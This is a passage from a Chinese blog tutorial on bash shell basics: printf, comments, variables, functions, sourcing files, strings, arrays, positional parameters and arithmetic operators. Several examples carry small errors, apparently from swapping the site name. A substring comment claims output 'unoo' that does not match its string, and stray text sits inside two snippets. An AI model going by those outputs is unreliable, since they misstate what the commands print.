<td>\ddd</td>
<td>表示1到3位数八进制值的字符。仅在格式字符串中有效</td>
</tr>
<tr>
<td>\0ddd</td>
<td>表示1到3位的八进制值字符</td>
</tr>
</tbody>
</table>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ <span class="built_in">printf</span> <span class="string">&quot;a string, no processing:&lt;%s&gt;\n&quot;</span> <span class="string">&quot;A\nB&quot;</span></span><br><span class="line">a string, no processing:&lt;A\nB&gt;</span><br><span class="line">python@ubuntu:~/test$ <span class="built_in">printf</span> <span class="string">&quot;a string, no processing:&lt;%b&gt;\n&quot;</span> <span class="string">&quot;A\nB&quot;</span></span><br><span class="line">a string, no processing:&lt;A</span><br><span class="line">B&gt;</span><br><span class="line">python@ubuntu:~/test$ <span class="built_in">printf</span> <span class="string">&quot;www.runoob.com \a&quot;</span></span><br><span class="line">www.runoob.com python@ubuntu:~/test$ </span><br></pre></td></tr></table></figure>
<h4 id="Shell-注释">Shell 注释</h4>
<p>以 <strong>#</strong> 开头的行就是注释，会被解释器忽略：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#--------------------------------------------</span></span><br><span class="line"><span class="comment"># 这是一个注释</span></span><br><span class="line"><span class="comment"># author：菜鸟教程</span></span><br><span class="line"><span class="comment"># site：www.taobao.com</span></span><br><span class="line"><span class="comment"># slogan：学的不仅是技术，更是梦想！</span></span><br><span class="line"><span class="comment">#--------------------------------------------</span></span><br><span class="line"><span class="comment">##### 用户配置区 开始 #####</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 这里可以添加脚本描述信息</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">##### 用户配置区 结束  #####</span></span><br></pre></td></tr></table></figure>
<p>多行注释还可以使用以下格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
<p>EOF 也可以使用其他符号:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">注释内容...</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">:&lt;&lt;!</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">!</span><br></pre></td></tr></table></figure>
<h3 id="Shell变量">Shell变量</h3>
<h4 id="定义变量">定义变量</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;taobao.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>变量名的命名须遵循如下规则：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。</p>
</li>
<li class="lvl-2">
<p>中间不能有空格，可以使用下划线（_）。</p>
</li>
<li class="lvl-2">
<p>不能使用标点符号。</p>
</li>
<li class="lvl-2">
<p>不能使用bash里的关键字（可用help命令查看保留关键字）。</p>
</li>
</ul>
<h4 id="使用变量">使用变量</h4>
<p>在变量名前面加美元符号即可，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;qinjx&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$your_name</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;your_name&#125;</span></span><br></pre></td></tr></table></figure>
<p>加花括号可以帮助解释器识别变量的边界，比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> skill <span class="keyword">in</span> Ada Coffe Action Java; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;I am good at <span class="variable">$&#123;skill&#125;</span>Script&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h4 id="只读变量">只读变量</h4>
<p>使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。</p>
<p>下面的例子尝试更改只读变量，结果报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/shell$ myUrl=<span class="string">&quot;http://www.google.com&quot;</span></span><br><span class="line">python@ubuntu:~/shell$ <span class="built_in">readonly</span> myUrl</span><br><span class="line">python@ubuntu:~/shell$ myUrl=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">-bash: myUrl: 只读变量</span><br></pre></td></tr></table></figure>
<h4 id="删除变量">删除变量</h4>
<p>使用 unset 命令可以删除变量，但不能删除只读变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">myUrl=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="built_in">unset</span> myUrl</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$myUrl</span></span><br></pre></td></tr></table></figure>
<h4 id="变量类型">变量类型</h4>
<p>运行shell时，会同时存在三种变量：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>1) 局部变量</strong> 局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。</p>
</li>
<li class="lvl-2">
<p><strong>2) 环境变量</strong> 所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。</p>
</li>
<li class="lvl-2">
<p><strong>3) shell变量</strong> shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行</p>
</li>
</ul>
<h3 id="Shell-函数">Shell 函数</h3>
<p>shell中函数的定义格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ <span class="keyword">function</span> ] funname [()]</span><br><span class="line">&#123;</span><br><span class="line">    action;</span><br><span class="line">    [<span class="built_in">return</span> int;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>1、可以带function fun() 定义，也可以直接fun() 定义,不带任何参数。</p>
</li>
<li class="lvl-2">
<p>2、参数返回，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255)</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithReturn</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;这个函数会对输入的两个数字进行相加运算...&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;输入第一个数字: &quot;</span></span><br><span class="line">    <span class="built_in">read</span> aNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;输入第二个数字: &quot;</span></span><br><span class="line">    <span class="built_in">read</span> anotherNum</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;两个数字分别为 <span class="variable">$aNum</span> 和 <span class="variable">$anotherNum</span> !&quot;</span></span><br><span class="line">    <span class="built_in">return</span> $((<span class="variable">$aNum</span>+<span class="variable">$anotherNum</span>))</span><br><span class="line">&#125;</span><br><span class="line">funWithReturn</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;输入的两个数字之和为 $? !&quot;</span></span><br></pre></td></tr></table></figure>
<p>输出，类似下面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">这个函数会对输入的两个数字进行相加运算...</span><br><span class="line">输入第一个数字: </span><br><span class="line">1</span><br><span class="line">输入第二个数字: </span><br><span class="line">2</span><br><span class="line">两个数字分别为 1 和 2 !</span><br><span class="line">输入的两个数字之和为 3 !</span><br></pre></td></tr></table></figure>
<p>函数返回值在调用该函数后通过 $? 来获得。</p>
<p>注意：所有函数在使用前必须定义。这意味着必须将函数放在脚本开始部分，直至shell解释器首次发现它时，才可以使用。调用函数仅使用其函数名即可。</p>
<p>在Shell中，调用函数时可以向其传递参数。在函数体内部，通过 <code>$n</code> 的形式来获取参数的值，例如，<code>$1</code>表示第一个参数，<code>$2</code>表示第二个参数…</p>
<p>带参数的函数示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">funWithParam</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第一个参数为 <span class="variable">$1</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第二个参数为 <span class="variable">$2</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十个参数为 <span class="variable">$10</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十个参数为 <span class="variable">$&#123;10&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;第十一个参数为 <span class="variable">$&#123;11&#125;</span> !&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;参数总数有 <span class="variable">$#</span> 个!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;作为一个字符串输出所有参数 $* !&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">第一个参数为 1 !</span><br><span class="line">第二个参数为 2 !</span><br><span class="line">第十个参数为 10 !</span><br><span class="line">第十个参数为 34 !</span><br><span class="line">第十一个参数为 73 !</span><br><span class="line">参数总数有 11 个!</span><br><span class="line">作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 34 73 !</span><br></pre></td></tr></table></figure>
<p>当n&gt;=10时，需要使用<code>$&#123;n&#125;</code>来获取参数。</p>
<p>另外，还有几个特殊字符用来处理参数：</p>
<table>
<thead>
<tr>
<th>参数处理</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>$#</td>
<td>传递到脚本的参数个数</td>
</tr>
<tr>
<td>$*</td>
<td>以一个单字符串显示所有向脚本传递的参数</td>
</tr>
<tr>
<td>$$</td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td>$!</td>
<td>后台运行的最后一个进程的ID号</td>
</tr>
<tr>
<td>$@</td>
<td>与$*相同，但是使用时加引号，并在引号中返回每个参数。</td>
</tr>
<tr>
<td>$-</td>
<td>显示Shell使用的当前选项，与set命令功能相同。</td>
</tr>
<tr>
<td>$?</td>
<td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td>
</tr>
</tbody>
</table>
<h3 id="文件包含">文件包含</h3>
<p>Shell 文件包含的语法格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. filename   <span class="comment"># 注意点号(.)和文件名中间有一空格</span></span><br><span class="line">或</span><br><span class="line"><span class="built_in">source</span> filename</span><br></pre></td></tr></table></figure>
<p><strong>实例</strong></p>
<p>创建两个 shell 脚本文件。</p>
<p><a href="http://test1.sh">test1.sh</a> 代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br></pre></td></tr></table></figure>
<p><a href="http://test2.sh">test2.sh</a> 代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 . 号来引用test1.sh 文件</span></span><br><span class="line">. ./test1.sh</span><br><span class="line"><span class="comment"># 或者使用以下包含文件代码</span></span><br><span class="line"><span class="comment"># source ./test1.sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;url地址：<span class="variable">$url</span>&quot;</span></span><br><span class="line">12345678</span><br></pre></td></tr></table></figure>
<p>接下来，我们为 <a href="http://test2.sh">test2.sh</a> 添加可执行权限并执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x test2.sh </span><br><span class="line">$ ./test2.sh </span><br><span class="line">url地址：http://www.baidu.com</span><br></pre></td></tr></table></figure>
<blockquote>
<p>**注：**被包含的文件 <a href="http://test1.sh">test1.sh</a> 不需要可执行权限。</p>
</blockquote>
<h3 id="shell数据类型">shell数据类型</h3>
<h4 id="字符串">字符串</h4>
<p>字符串可以用单引号，也可以用双引号，也可以不用引号。</p>
<p>单引号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&#x27;this is a string&#x27;</span>b</span><br></pre></td></tr></table></figure>
<p>单引号字符串的限制：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；</p>
</li>
<li class="lvl-2">
<p>单引号字串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。</p>
</li>
</ul>
<p>双引号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&#x27;taobao&#x27;</span></span><br><span class="line">str=<span class="string">&quot;Hello, I know you are \&quot;<span class="variable">$your_name</span>\&quot;! \n&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="variable">$str</span></span><br></pre></td></tr></table></figure>
<p>输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hello, I know you are <span class="string">&quot;taobao&quot;</span>! </span><br></pre></td></tr></table></figure>
<p>双引号的优点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>双引号里可以有变量</p>
</li>
<li class="lvl-2">
<p>双引号里可以出现转义字符</p>
</li>
</ul>
<p>拼接字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">your_name=<span class="string">&quot;taobao&quot;</span></span><br><span class="line"><span class="comment"># 使用双引号拼接</span></span><br><span class="line">greeting=<span class="string">&quot;hello, &quot;</span><span class="variable">$your_name</span><span class="string">&quot; !&quot;</span></span><br><span class="line">greeting_1=<span class="string">&quot;hello, <span class="variable">$&#123;your_name&#125;</span> !&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$greeting</span>  <span class="variable">$greeting_1</span></span><br><span class="line"><span class="comment"># 使用单引号拼接</span></span><br><span class="line">greeting_2=<span class="string">&#x27;hello, &#x27;</span><span class="variable">$your_name</span><span class="string">&#x27; !&#x27;</span></span><br><span class="line">greeting_3=<span class="string">&#x27;hello, $&#123;your_name&#125; !&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$greeting_2</span>  <span class="variable">$greeting_3</span></span><br></pre></td></tr></table></figure>
<p>输出结果为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hello, taobao ! hello, taobao !</span><br><span class="line">hello, taobao ! hello, <span class="variable">$&#123;your_name&#125;</span> !</span><br></pre></td></tr></table></figure>
<p><strong>获取字符串长度<code>$&#123;#s&#125;</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;abcd&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span> <span class="comment">#输出 4</span></span><br></pre></td></tr></table></figure>
<p><strong>截取字符串${s:n1:n2}</strong></p>
<p>以下实例从字符串第 <strong>2</strong> 个字符开始截取 <strong>4</strong> 个字符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;taobao is a great site&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;string:1:4&#125;</span> <span class="comment"># 输出 unoo</span></span><br></pre></td></tr></table></figure>
<p><strong>查找字符出现的位置<code>expr index</code></strong></p>
<p>查找字符 <strong>i</strong> 或 <strong>o</strong> 的位置(哪个字母先出现就计算哪个)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">string=<span class="string">&quot;taobao is a great site&quot;</span></span><br><span class="line"><span class="built_in">echo</span> `<span class="built_in">expr</span> index <span class="string">&quot;<span class="variable">$string</span>&quot;</span> io`  <span class="comment"># 输出 3</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong> 以上脚本中 <strong>`</strong> 是反引号，而不是单引号 <strong>'</strong>。</p>
<h4 id="数组">数组</h4>
<p>bash支持一维数组（不支持多维数组），并且没有限定数组的大小。</p>
<p>数组元素的下标由 0 开始编号。</p>
<h5 id="定义数组">定义数组</h5>
<p>在 Shell 中，用括号来表示数组，数组元素用&quot;空格&quot;符号分割开。定义数组的一般形式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array_name=(value0 value1 value2 value3)</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array_name=(</span><br><span class="line">value0</span><br><span class="line">value1</span><br><span class="line">value2</span><br><span class="line">value3</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>或单独定义数组的各个分量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[n]=valuen</span><br></pre></td></tr></table></figure>
<p>可以不使用连续的下标，而且下标的范围没有限制。</p>
<h5 id="读取数组">读取数组</h5>
<p>读取数组元素值的一般格式是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">valuen=<span class="variable">$&#123;array_name[n]&#125;</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">my_array=(A B <span class="string">&quot;C&quot;</span> D)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个元素为: <span class="variable">$&#123;my_array[0]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个元素为: <span class="variable">$&#123;my_array[1]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个元素为: <span class="variable">$&#123;my_array[2]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第四个元素为: <span class="variable">$&#123;my_array[3]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x test.sh </span><br><span class="line">$ ./test.sh</span><br><span class="line">第一个元素为: A</span><br><span class="line">第二个元素为: B</span><br><span class="line">第三个元素为: C</span><br><span class="line">第四个元素为: D</span><br></pre></td></tr></table></figure>
<p>使用 <code>@</code>或<code>*</code> 符号可以获取数组中的所有元素，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array_name[@]&#125;</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">my_array[0]=A</span><br><span class="line">my_array[1]=B</span><br><span class="line">my_array[2]=C</span><br><span class="line">my_array[3]=D</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组的元素为: <span class="variable">$&#123;my_array[*]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组的元素为: <span class="variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x test.sh </span><br><span class="line">$ ./test.sh</span><br><span class="line">数组的元素为: A B C D</span><br><span class="line">数组的元素为: A B C D</span><br></pre></td></tr></table></figure>
<h5 id="获取数组的长度">获取数组的长度</h5>
<p>获取数组长度的方法与获取字符串长度的方法相同，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 取得数组元素的个数</span></span><br><span class="line">length=<span class="variable">$&#123;#array_name[@]&#125;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">length=<span class="variable">$&#123;#array_name[*]&#125;</span></span><br><span class="line"><span class="comment"># 取得数组单个元素的长度</span></span><br><span class="line">lengthn=<span class="variable">$&#123;#array_name[n]&#125;</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">my_array[0]=A</span><br><span class="line">my_array[1]=B</span><br><span class="line">my_array[2]=C</span><br><span class="line">my_array[3]=D</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组元素个数为: <span class="variable">$&#123;#my_array[*]&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;数组元素个数为: <span class="variable">$&#123;#my_array[@]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x test.sh </span><br><span class="line">$ ./test.sh</span><br><span class="line">数组元素个数为: 4</span><br><span class="line">数组元素个数为: 4</span><br></pre></td></tr></table></figure>
<h4 id="Shell传递参数">Shell传递参数</h4>
<p>执行 Shell 脚本时，向脚本传递参数，脚本内获取参数的格式为：<strong>$n</strong>。</p>
<p><strong>n</strong> 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……</p>
<p><strong>$0</strong> 为执行的文件名</p>
<p>test.sh文件内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi test.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Shell 传递参数实例！&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;执行的文件名：<span class="variable">$0</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数为：<span class="variable">$1</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数为：<span class="variable">$2</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第三个参数为：<span class="variable">$3</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ sh test.sh 1 2 3</span><br><span class="line">Shell 传递参数实例！</span><br><span class="line">执行的文件名：test.sh</span><br><span class="line">第一个参数为：1</span><br><span class="line">第二个参数为：2</span><br><span class="line">第三个参数为：3</span><br></pre></td></tr></table></figure>
<p>参数获取：</p>
<table>
<thead>
<tr>
<th>参数处理</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>$#</td>
<td>传递到脚本的参数个数</td>
</tr>
<tr>
<td><code>$*</code></td>
<td>传递的参数作为一个字符串显示</td>
</tr>
<tr>
<td>$$</td>
<td>脚本运行的当前进程ID号</td>
</tr>
<tr>
<td>$!</td>
<td>后台运行的最后一个进程的ID号</td>
</tr>
<tr>
<td><code>$@</code></td>
<td>与<code>$*</code>相同，但是使用时加引号</td>
</tr>
<tr>
<td>$?</td>
<td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;参数个数为：<span class="variable">$#</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;$*传递的参数作为一个字符串显示：$*&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$@</span>传递的参数作为一个字符串显示：<span class="variable">$@</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;脚本运行的当前进程ID号：$$&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;后台运行的最后一个进程的ID号：$!&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;$?&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ ./test.sh 1 2 3</span><br><span class="line">参数个数为：3</span><br><span class="line">1 2 3传递的参数作为一个字符串显示：1 2 3</span><br><span class="line">1 2 3传递的参数作为一个字符串显示：1 2 3</span><br><span class="line">脚本运行的当前进程ID号：5059</span><br><span class="line">后台运行的最后一个进程的ID号：</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<p><code>$*</code>与<code>$@</code>的区别：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>只有在双引号中体现出来。假设在脚本运行时写了三个参数 1、2、3，，则<code>$*</code> 等价于 “1 2 3”（传递了一个参数），而<code>$@</code>等价于 “1” “2” “3”（传递了三个参数）。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \&quot;\$*\&quot; 演示 ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;$*&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \&quot;\$@\&quot; 演示 ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \$* 演示 ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $*; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \$@ 演示 ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python@ubuntu:~/test$ sh <span class="built_in">test</span> 1 2 3</span><br><span class="line">-- <span class="string">&quot;$*&quot;</span> 演示 ---</span><br><span class="line">1 2 3</span><br><span class="line">-- <span class="string">&quot;<span class="variable">$@</span>&quot;</span> 演示 ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">-- $* 演示 ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">-- <span class="variable">$@</span> 演示 ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
<h3 id="Shell基本运算符">Shell基本运算符</h3>
<p>Shell 和其他编程语言一样，支持多种运算符，包括：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>算数运算符</p>
</li>
<li class="lvl-2">
<p>关系运算符</p>
</li>
<li class="lvl-2">
<p>布尔运算符</p>
</li>
<li class="lvl-2">
<p>字符串运算符</p>
</li>
<li class="lvl-2">
<p>文件测试运算符</p>
</li>
</ul>
<p>原生bash不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。</p>
<p>expr 是一款表达式计算工具，使用它能完成表达式的求值操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">val=`<span class="built_in">expr</span> 2 + 2`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;两数之和为 : <span class="variable">$val</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>执行脚本，输出结果如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">两数之和为 : 4</span><br></pre></td></tr></table></figure>
<p>两点注意：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>表达式和运算符之间要有空格，例如 2+2 是不对的，必须写成 2 + 2。</p>
</li>
<li class="lvl-2">
<p>完整的表达式要被 <code> </code> 包含，这个字符是<strong>反引号</strong>在 Esc 键下边。</p>
</li>
</ul>
<h4 id="算术运算符">算术运算符</h4>
<p>下表列出了常用的算术运算符，假定变量 a 为 10，变量 b 为 20：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>说明</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>加法</td>
<td><code>expr $a + $b</code> 结果为 30。</td>
</tr>
<tr>
<td>-</td>
